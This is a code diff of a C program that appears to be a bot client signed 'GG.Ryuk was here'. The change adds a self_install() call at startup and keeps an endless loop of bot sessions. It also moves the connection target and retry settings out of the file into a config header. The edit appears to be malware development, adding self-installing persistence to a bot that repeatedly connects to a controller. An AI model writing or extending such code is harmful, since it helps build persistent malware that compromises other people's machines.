@@ -1,3 +1,9 @@
+/*
+ * GG.Ryuk was here.
+ *
+ */
+
+
 #include <stdio.h>
 #include <netinet/in.h>
 #include <unistd.h>
@@ -5,14 +11,9 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 
+#include "config.h"
+#include "coreinstall.hpp"
 #include "tcp_client.hpp"
-
-#define ATTEMPTS_MAX 10
-
-#define IDLE_BETWEEN_CONNECT 1000000
-
-#define TARGET_IP (char*)"127.0.0.1"
-#define TARGET_PORT (char*)"5554"
 
 int
 bot_single_session()
@@ -21,7 +22,7 @@ bot_single_session()
 	bool ret;
 	int i;
 
-	//close unusible fds
+	//close unusable fds
 	//close(0);
 	//close(1);
 
@@ -71,11 +72,13 @@ err:
 int
 main(int argc, char *argv[])
 {
+	if (NEED_INSTALLATION)
+		self_install();
+	
 	while (1) {
 		//parse conf,
 		bot_single_session();
 	}
 	return 0;
 }
-
 
